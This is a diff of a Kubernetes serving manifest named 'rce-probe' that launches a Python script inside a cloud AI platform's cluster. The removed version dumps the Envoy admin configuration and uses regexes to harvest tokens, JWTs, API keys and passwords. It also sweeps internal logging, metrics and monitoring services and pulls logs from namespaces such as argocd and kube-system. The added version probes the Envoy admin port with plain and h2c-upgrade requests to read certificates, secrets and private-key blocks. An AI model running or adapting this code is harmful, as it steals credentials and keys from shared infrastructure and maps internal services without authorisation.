@@ -8,7 +8,7 @@ metadata:
   annotations:
     scenarios.ai.sap.com/name: "rce-probe"
     executables.ai.sap.com/name: "rce-probe"
-    executables.ai.sap.com/description: "probe-v18-loki-envoy-fluentbit"
+    executables.ai.sap.com/description: "envoy-admin-h2c-verify"
 spec:
   template:
     apiVersion: "serving.kserve.io/v1beta1"
@@ -27,179 +27,94 @@ spec:
           command: ["/bin/sh", "-c"]
           args:
           - |
-            cat > /tmp/probe.py << 'PYEOF'
-            import socket, ssl, re, json, time, os
-            import urllib.request, urllib.error
+            cat > /tmp/probe.py <<'PYEOF'
+            import socket, re
 
-            def report(k, v):
-                print(f"[P18] {k}: {str(v)[:8000]}", flush=True)
-
-            def http_get(url, headers=None, timeout=10):
+            def fetch(path, label, h2c=False):
                 try:
-                    req = urllib.request.Request(url, headers=headers or {})
-                    ctx = ssl.create_default_context()
-                    ctx.check_hostname = False
-                    ctx.verify_mode = ssl.CERT_NONE
-                    with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
-                        return r.read().decode(errors="replace"), r.status, dict(r.headers)
-                except urllib.error.HTTPError as e:
-                    body = ""
-                    try: body = e.read().decode(errors="replace")[:2000]
-                    except: pass
-                    return f"HTTP_{e.code}:{body}", e.code, {}
-                except Exception as e:
-                    return f"ERR:{type(e).__name__}:{e}", 0, {}
-
-            def tcp_open(host, port, timeout=4):
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(timeout)
-                try:
-                    s.connect((host, port))
+                    s = socket.create_connection(("127.0.0.1", 15000), timeout=15)
+                    if h2c:
+                        req = (
+                            f"GET {path} HTTP/1.1\r\n"
+                            f"Host: 127.0.0.1:15000\r\n"
+                            f"User-Agent: probe\r\n"
+                            f"Accept: */*\r\n"
+                            f"Connection: Upgrade, HTTP2-Settings\r\n"
+                            f"Upgrade: h2c\r\n"
+                            f"HTTP2-Settings: AAMAAABkAAQAAP__\r\n"
+                            f"\r\n"
+                        )
+                    else:
+                        req = (
+                            f"GET {path} HTTP/1.1\r\n"
+                            f"Host: 127.0.0.1:15000\r\n"
+                            f"User-Agent: probe\r\n"
+                            f"Accept: */*\r\n"
+                            f"Connection: close\r\n"
+                            f"\r\n"
+                        )
+                    s.sendall(req.encode())
+                    data = b""
+                    while True:
+                        chunk = s.recv(65536)
+                        if not chunk:
+                            break
+                        data += chunk
+                        if len(data) > 4_000_000:
+                            break
                     s.close()
-                    return True
-                except:
-                    return False
-                finally:
-                    try: s.close()
-                    except: pass
+                except Exception as e:
+                    print(f"[H2C] {label} ERR: {e}", flush=True)
+                    return
+                head, _, body = data.partition(b"\r\n\r\n")
+                head_text = head.decode("latin1", "replace")
+                status_line = head_text.split("\r\n", 1)[0]
+                body_len = len(body)
+                has_cert_pem = b"BEGIN CERTIFICATE" in body
+                has_dynamic_secrets = b"dynamic_active_secrets" in body
+                has_spiffe = b"spiffe://cluster.local" in body
+                has_inline_bytes = b"inline_bytes" in body
+                has_pk_block = b'"private_key":' in body
+                head_excerpt = head_text[:300].replace("\r", "\\r").replace("\n", "\\n")
+                body_excerpt = body[:200].decode("latin1", "replace").replace("\r", "\\r").replace("\n", "\\n")
+                print(f"[H2C] {label} status={status_line}", flush=True)
+                print(f"[H2C] {label} headers={head_excerpt}", flush=True)
+                print(f"[H2C] {label} body_len={body_len}", flush=True)
+                print(f"[H2C] {label} markers: cert_pem={has_cert_pem} dynamic_secrets={has_dynamic_secrets} spiffe={has_spiffe} inline_bytes={has_inline_bytes} private_key_block={has_pk_block}", flush=True)
+                if has_cert_pem:
+                    m = re.search(rb"-----BEGIN CERTIFICATE-----\s*([A-Za-z0-9+/=\s]+?)-----END CERTIFICATE-----", body)
+                    if m:
+                        first_80 = m.group(1).replace(b"\n", b"").replace(b" ", b"")[:80].decode()
+                        print(f"[H2C] {label} cert_b64_prefix={first_80}", flush=True)
+                if has_inline_bytes:
+                    for i, m in enumerate(re.finditer(rb'"inline_bytes":\s*"([A-Za-z0-9+/=]+)"', body)):
+                        if i >= 3:
+                            break
+                        ib = m.group(1).decode()[:80]
+                        print(f"[H2C] {label} inline_bytes[{i}]_prefix={ib}", flush=True)
+                if has_pk_block:
+                    m = re.search(rb'"private_key":\s*\{[^}]{0,500}\}', body)
+                    if m:
+                        pk_excerpt = m.group(0)[:300].decode("latin1", "replace").replace("\r", "\\r").replace("\n", "\\n")
+                        print(f"[H2C] {label} private_key_block={pk_excerpt}", flush=True)
+                print(f"[H2C] {label} body_excerpt={body_excerpt}", flush=True)
+                print(f"[H2C] ----", flush=True)
 
-            # 1. ENVOY FULL CONFIG DUMP
-            report("---", "=== 1. ENVOY ADMIN FULL CONFIG DUMP ===")
-            body, code, _ = http_get("http://127.0.0.1:15000/config_dump", timeout=30)
-            report("ENVOY_CONFIG_SIZE", f"[{code}] len={len(body)}")
-            if code == 200:
-                with open("/tmp/envoy_config.json", "w") as f:
-                    f.write(body)
-                auth_patterns = [
-                    r'"authorization":\s*"([^"]{10,})"',
-                    r'"x-api-key":\s*"([^"]{6,})"',
-                    r'"x-auth-token":\s*"([^"]{6,})"',
-                    r'"[Bb]earer\s+([A-Za-z0-9\-_\.]{20,})"',
-                    r'"token":\s*"([^"]{10,})"',
-                    r'"secret":\s*"([^"]{6,})"',
-                    r'"password":\s*"([^"]{4,})"',
-                    r'"value":\s*"([A-Za-z0-9+/=]{40,})"',
-                ]
-                for pat in auth_patterns:
-                    for m in re.findall(pat, body, re.IGNORECASE):
-                        report(f"ENVOY_CRED", f"pat={pat[:30]} val={m[:400]}")
-                for i, block in enumerate(re.findall(r'"request_headers_to_add":\s*\[(.*?)\]', body, re.DOTALL)[:10]):
-                    report(f"ENVOY_REQ_HDRS_{i}", block[:1000])
-                cluster_addrs = list(set(re.findall(
-                    r'"address":\s*\{[^}]*"address":\s*"([^"]+)"[^}]*"port_value":\s*(\d+)', body)))
-                report("ENVOY_CLUSTER_ADDRS", str(cluster_addrs[:60]))
-                jwt_tokens = list(set(re.findall(
-                    r'(eyJ[A-Za-z0-9\-_]{20,}\.[A-Za-z0-9\-_]{20,}\.[A-Za-z0-9\-_]{20,})', body)))
-                report("ENVOY_JWTS", jwt_tokens[:10])
+            print("[H2C] START envoy-admin-h2c-verify", flush=True)
 
-            body_stats, sc, _ = http_get("http://127.0.0.1:15000/stats", timeout=15)
-            if sc == 200:
-                auth_stats = [l for l in body_stats.split("\n")
-                              if any(x in l.lower() for x in
-                                     ["rbac","authn","authz","jwt","filter_denied","ssl_error"])
-                              and l.strip()]
-                report("ENVOY_AUTH_STATS", "\n".join(auth_stats[:60]))
+            fetch("/", "ROOT_plain", h2c=False)
+            fetch("/certs", "CERTS_plain", h2c=False)
+            fetch("/certs", "CERTS_h2c", h2c=True)
+            fetch("/config_dump?resource=dynamic_active_secrets", "SECRETS_plain", h2c=False)
+            fetch("/config_dump?resource=dynamic_active_secrets", "SECRETS_h2c", h2c=True)
+            fetch("/server_info", "SERVER_INFO_plain", h2c=False)
+            fetch("/runtime", "RUNTIME_plain", h2c=False)
+            fetch("/listeners?format=json", "LISTENERS_plain", h2c=False)
+            fetch("/stats?filter=server.live|sds.|secret", "STATS_plain", h2c=False)
 
-            # 2. FLUENTBIT HTTP API (port 2020)
-            report("---", "=== 2. FLUENTBIT HTTP API ===")
-            fb_ips = ["100.64.76.16", "100.64.33.11", "100.109.242.36"]
-            for fb_ip in fb_ips:
-                if not tcp_open(fb_ip, 2020, timeout=5):
-                    report(f"FB_{fb_ip}:2020", "CLOSED")
-                    continue
-                report(f"FB_{fb_ip}:2020", "OPEN")
-                for path in ["/api/v1/uptime", "/api/v1/health", "/api/v1/metrics",
-                              "/api/v1/outputs", "/api/v1/inputs", "/api/v1/filters",
-                              "/api/v1/pipeline"]:
-                    body, code, _ = http_get(f"http://{fb_ip}:2020{path}", timeout=8)
-                    if code and code != 0 and "ERR:timed" not in body and "ERR:Connection" not in body:
-                        report(f"FB_{fb_ip}{path}", f"[{code}] {body[:3000]}")
-
-            # 3. LOKI DISCOVERY
-            report("---", "=== 3. LOKI DISCOVERY ===")
-            loki_candidates = [
-                ("loki.logging.svc.cluster.local", 3100),
-                ("loki.loki.svc.cluster.local", 3100),
-                ("loki.monitoring.svc.cluster.local", 3100),
-                ("loki.opentelemetry.svc.cluster.local", 3100),
-                ("loki-stack.loki-stack.svc.cluster.local", 3100),
-                ("loki-gateway.logging.svc.cluster.local", 80),
-                ("loki-distributed-gateway.logging.svc.cluster.local", 80),
-                ("loki.aicore.svc.cluster.local", 3100),
-            ]
-            for host, port in loki_candidates:
-                body, code, _ = http_get(f"http://{host}:{port}/ready", timeout=6)
-                if code and code != 0 and "ERR:timed" not in body and "ERR:Connection" not in body:
-                    report(f"LOKI_{host}_{port}_ready", f"[{code}] {body[:300]}")
-                    if code == 200:
-                        import urllib.parse
-                        body2, c2, _ = http_get(f"http://{host}:{port}/loki/api/v1/labels", timeout=8)
-                        report(f"LOKI_{host}_LABELS", f"[{c2}] {body2[:2000]}")
-                        for ns in ["velero","argocd","aicore","couchdb","kube-system","opentelemetry"]:
-                            q = urllib.parse.quote(f'{{namespace="{ns}"}}')
-                            now = int(time.time() * 1e9)
-                            url = (f"http://{host}:{port}/loki/api/v1/query_range"
-                                   f"?query={q}&start={now - 3600*int(1e9)}&end={now}&limit=50")
-                            body3, c3, _ = http_get(url, timeout=10)
-                            if c3 == 200:
-                                report(f"LOKI_LOGS_{ns}", body3[:4000])
-
-            # 4. KSM - mine loki + dynatrace service IPs
-            report("---", "=== 4. KSM SERVICE DISCOVERY ===")
-            ksm_body, ksm_code, _ = http_get(
-                "http://ksm-multi-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics",
-                timeout=20)
-            if ksm_code == 200:
-                loki_ips = re.findall(
-                    r'kube_service_info\{[^}]*service="[^"]*loki[^"]*"[^}]*cluster_ip="([^"]+)"',
-                    ksm_body, re.IGNORECASE)
-                report("KSM_LOKI_IPS", loki_ips)
-                for ip in loki_ips:
-                    for port in [3100, 80, 8080]:
-                        body, code, _ = http_get(f"http://{ip}:{port}/ready", timeout=5)
-                        if code and "ERR:timed" not in body and "ERR:Connection" not in body:
-                            report(f"LOKI_IP_{ip}:{port}", f"[{code}] {body[:300]}")
-                            if code == 200:
-                                body2, c2, _ = http_get(f"http://{ip}:{port}/loki/api/v1/labels", timeout=8)
-                                report(f"LOKI_IP_{ip}_LABELS", f"[{c2}] {body2[:2000]}")
-
-                dt_ips = re.findall(
-                    r'kube_service_info\{[^}]*namespace="dynatrace"[^}]*cluster_ip="([^"]+)"',
-                    ksm_body)
-                report("KSM_DT_IPS", dt_ips)
-                for ip in dt_ips[:5]:
-                    for port in [80, 8080, 443, 8443, 9999]:
-                        body, code, _ = http_get(f"http://{ip}:{port}/", timeout=4)
-                        if code and "ERR:timed" not in body and "ERR:Connection" not in body:
-                            report(f"DT_IP_{ip}:{port}", f"[{code}] {body[:400]}")
-
-                # New namespaces from KSM
-                namespaces = list(set(re.findall(r'namespace="([^"]+)"', ksm_body)))
-                report("KSM_ALL_NAMESPACES", sorted(namespaces))
-
-            # 5. OTel COLLECTOR
-            report("---", "=== 5. OTel COLLECTOR ===")
-            for port in [8888, 55679, 13133]:
-                for path in ["/metrics", "/debug/pipelinez", "/debug/extensionz", "/healthz"]:
-                    body, code, _ = http_get(
-                        f"http://otel-collector.opentelemetry.svc.cluster.local:{port}{path}", timeout=5)
-                    if code and "ERR:timed" not in body and "ERR:Connection" not in body:
-                        report(f"OTEL_{port}{path}", f"[{code}] {body[:1000]}")
-
-            # 6. PROMETHEUS / THANOS
-            report("---", "=== 6. PROMETHEUS / THANOS ===")
-            for base in [
-                "http://prometheus-server.monitoring.svc.cluster.local:80",
-                "http://prometheus.monitoring.svc.cluster.local:9090",
-                "http://thanos-query.monitoring.svc.cluster.local:9090",
-            ]:
-                body, code, _ = http_get(f"{base}/-/ready", timeout=5)
-                if code and "ERR:timed" not in body and "ERR:Connection" not in body:
-                    report(f"PROM_{base}", f"[{code}] {body[:200]}")
-
-            report("DONE", "probe v16 complete")
+            print("[H2C] DONE", flush=True)
             PYEOF
-            python3 /tmp/probe.py 2>&1
+            python3 /tmp/probe.py
             python3 -c "
             import http.server
             class H(http.server.BaseHTTPRequestHandler):
@@ -208,18 +123,3 @@ spec:
                 def log_message(self, *a): pass
             http.server.HTTPServer(('', 8080), H).serve_forever()
             "
-          ports:
-          - containerPort: 8080
-            protocol: TCP
-          readinessProbe:
-            httpGet:
-              path: /
-              port: 8080
-            initialDelaySeconds: 30
-            periodSeconds: 10
-          livenessProbe:
-            httpGet:
-              path: /
-              port: 8080
-            initialDelaySeconds: 30
-            periodSeconds: 15
